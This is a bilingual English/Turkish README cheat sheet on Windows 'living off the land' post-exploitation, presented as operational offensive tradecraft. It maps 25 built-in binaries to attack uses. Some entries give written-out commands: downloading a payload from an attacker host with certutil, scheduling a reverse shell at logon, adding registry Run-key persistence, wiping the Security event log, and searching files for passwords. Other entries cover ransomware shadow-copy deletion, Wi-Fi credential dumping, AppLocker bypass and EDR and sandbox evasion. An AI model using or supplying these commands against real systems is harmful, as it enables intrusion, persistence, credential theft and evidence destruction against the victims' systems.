<div align="center">

  <img src="https://capsule-render.vercel.app/render?type=waving&color=0078D4&height=250&section=header&text=WINDOWS%20POST-EXPLOITATION&fontSize=36&animation=fadeIn&fontColor=ffffff&desc=Living%20Off%20The%20Land%20(LotL)%20Tradecraft&descFontSize=20" />

  <br>

  <img src="https://img.shields.io/badge/TARGET-CORPORATE_AD-blue?style=for-the-badge&logo=windows" />
  <img src="https://img.shields.io/badge/TECHNIQUE-LOLBINS-red?style=for-the-badge&logo=hack-the-box" />
  <img src="https://img.shields.io/badge/STATUS-OPERATIONAL-success?style=for-the-badge" />
  <img src="https://img.shields.io/badge/LANG-BILINGUAL_EN_TR-orange?style=for-the-badge" />

</div>

<br>

> **"Amateurs hack systems using tools; Professionals hack systems using the system itself. In a restricted environment, Windows built-in binaries are the deadliest weapons."**

<br>

## 🧭 **NAVIGATION / NAVİGASYON**

| 🇺🇸 **[ENGLISH: OFFENSIVE TRADECRAFT](#-english-offensive-tradecraft)** | 🇹🇷 **[TÜRKÇE: SALDIRI ZANAATI](#-türkçe-saldırı-zanaatı)** |
| :---: | :---: |
| *LOLBins, Persistence, & Recon* | *Yerel Araçlar, Kalıcılık ve Keşif* |

<br>

<div id="english-offensive-tradecraft"></div>

# 🇺🇸 ENGLISH: OFFENSIVE TRADECRAFT

<hr style="height:4px;border-width:0;color:#0078D4;background-color:#0078D4">

### 🧠 I. THE PHILOSOPHY: LIVING OFF THE LAND (LotL)
Why use native Windows commands instead of hacker tools?
1.  **Evasion:** Antivirus (EDR) blocks `nmap.exe` or `mimikatz.exe` instantly. It usually trusts `certutil.exe` or `powershell.exe`.
2.  **Stealth:** Using system tools blends in with legitimate administrator traffic.
3.  **Availability:** You don't need to upload anything. The weapons are already installed on the target.

### ⚙️ II. THE ARSENAL: WEAPONIZED COMMANDS

*This table maps standard Windows commands to their offensive security applications.*

| # | Binary/Command | Category | 💀 Offensive Application (Hacker Vision) |
| :--- | :--- | :--- | :--- |
| **1** | `certutil.exe` | **Download** | **Bypass:** Used to download malware/payloads from the web when browsers are blocked. <br>`certutil -urlcache -split -f http://attacker.com/payload.exe` |
| **2** | `schtasks.exe` | **Persistence** | **Backdoor:** Scheduling a reverse shell to execute every morning or upon user logon. <br>`schtasks /create /tn "Update" /tr "C:\shell.exe" /sc onlogon` |
| **3** | `reg.exe` | **Persistence** | **Registry Run Keys:** Adding malware to the Auto-Run keys to survive reboots. <br>`reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run ...` |
| **4** | `wmic.exe` | **Recon** | **Stealth Recon:** Uninstalling security software or listing patches without triggering alerts. <br>`wmic product get name,version` |
| **5** | `net user` | **Enum** | **Domain Recon:** Identifying Domain Admins to target for credential theft. <br>`net user /domain` |
| **6** | `arp -a` | **Discovery** | **Mapping:** Finding other active hosts in the subnet (Lateral Movement targets) without Nmap. |
| **7** | `tasklist` | **Enum** | **Defense Awareness:** Identifying running EDR/AV processes (e.g., `MsMpEng.exe`, `cb.exe`). |
| **8** | `netstat -ano` | **Net** | **Connection Analysis:** Finding high ports connected to internal servers (Pivoting points). |
| **9** | `systeminfo` | **Enum** | **Exploit Check:** Checking "Hotfixes" to find missing patches for Kernel Exploits. |
| **10** | `rundll32.exe` | **Exec** | **Bypass:** Executing malicious code hidden inside a DLL to bypass AppLocker rules. |
| **11** | `bitsadmin.exe` | **Download** | **Stealth Download:** Downloading huge files slowly in the background to evade Network IDS. |
| **12** | `wevtutil` | **Anti-Forensics** | **Log Wiping:** Clearing specific Event Logs to hide traces of the intrusion. <br>`wevtutil cl Security` |
| **13** | `vssadmin` | **Destruction** | **Ransomware Tactic:** Deleting Shadow Copies so the victim cannot recover files. |
| **14** | `sc.exe` | **PrivEsc** | **Service Abuse:** Modifying a service binary path to run a shell as SYSTEM. |
| **15** | `findstr` | **Hunt** | **Cred Hunting:** Searching files for "password" or "API_KEY" strings recursively. <br>`findstr /s /i "password" *.xml *.txt` |
| **16** | `whoami /priv` | **PrivEsc** | **Token Check:** Checking for `SeDebugPrivilege` or `SeImpersonatePrivilege` (Potato Exploits). |
| **17** | `cmdkey /list` | **Creds** | **Stored Creds:** Checking for saved RDP credentials that can be reused instantly. |
| **18** | `dir /R` | **Evasion** | **ADS:** Hiding malware inside the "Alternate Data Streams" of a text file. |
| **19** | `netsh wlan` | **Creds** | **Wi-Fi Stealing:** Dumping saved Wi-Fi passwords in cleartext. |
| **20** | `powershell` | **Exec** | **In-Memory Exec:** Running scripts directly in RAM (`IEX`) to avoid writing to disk (Fileless Malware). |
| **21** | `fsutil` | **Anti-Forensics** | **Timestomping:** Checking USN Journal or creating dummy files to fill disk space. |
| **22** | `query user` | **OpSec** | **Safety Check:** Checking if an Admin is currently active via RDP before acting. |
| **23** | `net view` | **Discovery** | **Share Hunting:** Finding open file shares (`SMB`) containing sensitive documents. |
| **24** | `timeout` | **Evasion** | **Sandbox Bypass:** Pausing execution to fool automated malware analysis sandboxes. |
| **25** | `forfiles` | **Batch** | **Mass Action:** Executing a command on many files at once (often used in Ransomware). |

<br><br>

<div id="türkçe-saldırı-zanaatı"></div>

# 🇹🇷 TÜRKÇE: SALDIRI ZANAATI

<hr style="height:4px;border-width:0;color:#0078D4;background-color:#0078D4">

### 🧠 I. FELSEFE: ARAZİDEN GEÇİNME (LotL)
Hacker araçları yerine neden Windows'un kendi komutlarını kullanıyoruz?
1.  **Atlatma (Evasion):** Antivirüsler (EDR) `nmap.exe` veya `mimikatz` gördüğünde alarm verir. Ancak `certutil.exe` veya `powershell.exe` gibi sistem dosyalarına genellikle güvenirler.
2.  **Gizlilik (Stealth):** Sistem araçlarını kullanmak, saldırgan trafiğinin normal yönetici trafiği gibi görünmesini sağlar.
3.  **Erişilebilirlik:** Hedef sisteme dosya yüklemenize gerek yoktur. Silahlar zaten işletim sisteminin içinde yüklüdür.

### ⚙️ II. CEPHANELİK: SİLAHLAŞTIRILMIŞ KOMUTLAR

*Bu tablo, standart Windows komutlarının siber saldırı operasyonlarındaki kullanımını haritalandırır.*

| # | Binary/Komut | Kategori | 💀 Saldırı Uygulaması (Hacker Vizyonu) |
| :--- | :--- | :--- | :--- |
| **1** | `certutil.exe` | **İndirme** | **Atlatma:** Tarayıcılar kilitli olduğunda internetten malware/payload indirmek için kullanılır. |
| **2** | `schtasks.exe` | **Kalıcılık** | **Backdoor:** Her sabah veya kullanıcı giriş yaptığında virüsü çalıştıracak görev oluşturmak. |
| **3** | `reg.exe` | **Kalıcılık** | **Registry Run:** Malware'i otomatik başlatma anahtarlarına ekleyerek yeniden başlatmada çalışmasını sağlamak. |
| **4** | `wmic.exe` | **Keşif** | **Gizli Keşif:** Alarm tetiklemeden yüklü güvenlik yamalarını veya yazılımları listelemek. |
| **5** | `net user` | **Numaralandırma** | **Domain Keşfi:** Parola saldırısı yapılacak "Domain Admin" hesaplarını tespit etmek. |
| **6** | `arp -a` | **Keşif** | **Haritalama:** Nmap kullanmadan aynı ağdaki diğer aktif cihazları (Yanal Hareket hedefleri) bulmak. |
| **7** | `tasklist` | **Numaralandırma** | **Savunma Analizi:** Arka planda çalışan EDR/AV süreçlerini (örn: `MsMpEng.exe`) tespit etmek. |
| **8** | `netstat -ano` | **Ağ** | **Bağlantı Analizi:** İç sunuculara bağlı portları bularak önemli makinelere sıçrama noktaları yakalamak. |
| **9** | `systeminfo` | **Numaralandırma** | **Exploit Kontrolü:** "Hotfix" listesine bakarak Kernel Exploit için eksik yamaları bulmak. |
| **10** | `rundll32.exe` | **Çalıştırma** | **Bypass:** AppLocker kurallarını aşmak için bir DLL içine gizlenmiş zararlı kodu çalıştırmak. |
| **11** | `bitsadmin.exe` | **İndirme** | **Gizli İndirme:** IDS (Saldırı Tespit Sistemi) yakalanmamak için dosyayı arka planda çok yavaş indirmek. |
| **12** | `wevtutil` | **Anti-Forensics** | **İz Silme:** Sızma izlerini yok etmek için belirli Olay Günlüklerini (Event Logs) temizlemek. |
| **13** | `vssadmin` | **Yıkım** | **Fidye Yazılımı Taktiği:** Kurban dosyaları geri getiremesin diye Gölge Kopyaları silmek. |
| **14** | `sc.exe` | **PrivEsc** | **Servis Sömürüsü:** Bir servisin çalıştığı dosya yolunu değiştirerek SYSTEM yetkisiyle shell açmak. |
| **15** | `findstr` | **Av** | **Veri Avı:** Dosyaların içinde "password" veya "API_KEY" kelimelerini özyinelemeli aramak. |
| **16** | `whoami /priv` | **PrivEsc** | **Token Kontrolü:** `SeDebugPrivilege` veya `SeImpersonate` yetkilerini kontrol etmek (Potato Exploitleri). |
| **17** | `cmdkey /list` | **Kimlik** | **Kayıtlı Şifreler:** Tekrar kullanılabilecek kayıtlı RDP kimlik bilgilerini kontrol etmek. |
| **18** | `dir /R` | **Atlatma** | **ADS:** Malware'i basit bir metin dosyasının "Alternatif Veri Akışı" içine gizlemek. |
| **19** | `netsh wlan` | **Kimlik** | **Wi-Fi Hırsızlığı:** Kayıtlı Wi-Fi şifrelerini açık metin olarak dökmek. |
| **20** | `powershell` | **Çalıştırma** | **Bellek İçi Çalıştırma:** Diske hiç yazmadan zararlı scripti doğrudan RAM'de çalıştırmak (Fileless Malware). |
| **21** | `fsutil` | **Anti-Forensics** | **Timestomping:** USN Günlüğünü kontrol etmek veya diski doldurmak için sahte dosya yaratmak. |
| **22** | `query user` | **OpSec** | **Güvenlik Kontrolü:** Operasyon yapmadan önce o an bağlı bir yönetici olup olmadığını kontrol etmek. |
| **23** | `net view` | **Keşif** | **Paylaşım Avı:** Ağda hassas belge içeren açık dosya paylaşımlarını (SMB) bulmak. |
| **24** | `timeout` | **Atlatma** | **Sandbox Atlatma:** Otomatik malware analiz sistemlerini kandırmak için çalışmayı duraklatmak. |
| **25** | `forfiles` | **Toplu İşlem** | **Toplu Eylem:** Bir komutu yüzlerce dosyada aynı anda çalıştırmak (Genelde Fidye yazılımlarında kullanılır). |

<br>

<div align="center">
  <img src="https://capsule-render.vercel.app/render?type=soft&color=0078D4&height=100&section=footer&text=SUPREME%20WINDOWS%20REFERENCE&fontSize=25&animation=fadeIn&fontColor=ffffff" />
  <br>
  <i>"In the Registry we hide, through the SMB we glide."</i>
</div>